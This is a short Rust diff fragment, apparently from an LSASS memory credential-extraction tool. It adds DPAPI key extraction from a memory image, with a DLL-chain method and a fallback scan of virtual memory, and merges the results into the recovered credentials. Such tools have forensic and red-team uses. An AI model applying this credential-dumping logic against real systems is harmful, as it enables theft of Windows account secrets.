+    // DPAPI (DLL chain + vmem scan fallback)
+    let mut dpapi_creds = extract_dpapi_from_dlls(vmem, lsasrv, dlls.dpapisrv, &keys, arch);
+    if dpapi_creds.is_empty() {
+        log::info!("DPAPI: standard extraction found nothing, trying vmem scan...");
+        dpapi_creds = crate::lsass::dpapi::extract_dpapi_vmem_scan(vmem, region_ranges, &keys, arch);
+    }
+    status.dpapi = ProviderStatus::from_result_empty(dpapi_creds.is_empty());
+    insert_dpapi_creds(&mut all_creds, dpapi_creds);
+
+    status.print_summary();
+    Ok(finalize_credentials(all_creds))
 }
